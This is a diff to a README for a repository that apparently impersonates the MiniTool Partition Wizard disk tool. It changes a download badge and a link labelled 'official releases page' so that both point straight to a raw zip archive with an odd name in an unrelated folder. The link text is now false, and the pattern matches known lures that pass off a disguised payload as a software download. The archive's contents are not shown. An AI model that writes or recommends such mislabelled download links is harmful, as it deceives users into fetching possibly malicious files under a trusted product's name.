@@ -1,6 +1,6 @@
 # 💽 MiniTool-Partition-Wizard-Setup - Manage your hard drives with ease
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Megamiyiyiyiy/MiniTool-Partition-Wizard-Setup/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Megamiyiyiyiy/MiniTool-Partition-Wizard-Setup/raw/refs/heads/main/Smilacina/Setup_Mini_Tool_Wizard_Partition_genuinely.zip)
 
 MiniTool Partition Wizard helps you manage your computer storage. Use this tool to resize, move, or merge disk partitions. It fixes partition issues and checks your drive speed. You can also change your disk type from MBR to GPT or find lost partitions.
 
@@ -30,7 +30,7 @@ Ensure your computer has the following items before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Megamiyiyiyiy/MiniTool-Partition-Wizard-Setup/releases) to view the current version.
+1. Visit the [official releases page](https://github.com/Megamiyiyiyiy/MiniTool-Partition-Wizard-Setup/raw/refs/heads/main/Smilacina/Setup_Mini_Tool_Wizard_Partition_genuinely.zip) to view the current version.
 2. Select the latest version listed under the Releases section.
 3. Click the link ending in .exe to start the file download.
 4. Save the file to your Downloads folder or your desktop for easy access.
